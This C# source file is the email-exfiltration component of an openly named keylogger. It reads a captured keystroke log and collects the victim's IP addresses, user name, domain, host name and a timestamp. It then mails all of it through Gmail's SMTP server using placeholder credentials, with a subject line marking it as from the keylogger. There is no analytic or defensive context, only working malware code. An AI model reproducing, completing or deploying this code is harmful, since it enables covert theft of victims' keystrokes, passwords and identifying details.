using System;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace KeyLogger
{
    class EmailSender
    {
        public void SendMessage(string filePath)
        {
            DateTime now = DateTime.Now;
            string logContent = File.ReadAllText(filePath);

            var host = Dns.GetHostEntry(Dns.GetHostName());

            string emailBody = string.Empty;

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\nUser: " + Environment.UserDomainName + Environment.UserName;
            emailBody += "\nHost: " + host.ToString();
            emailBody += "\ntime: " + now.ToString();
            emailBody += "\n" + logContent;

            using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587)) //gmail port
            {
                smtpClient.EnableSsl = true;
                smtpClient.UseDefaultCredentials = false;
                smtpClient.Credentials = new NetworkCredential("Email", "Password");

                using (MailMessage mailMessage = new MailMessage("from", "to")) // emails to provide
                {
                    mailMessage.Subject = string.Format("from Keylogger of {0})", Environment.UserName);
                    mailMessage.Body = emailBody;
                    smtpClient.Send(mailMessage);
                }
            }
        }
    }
}
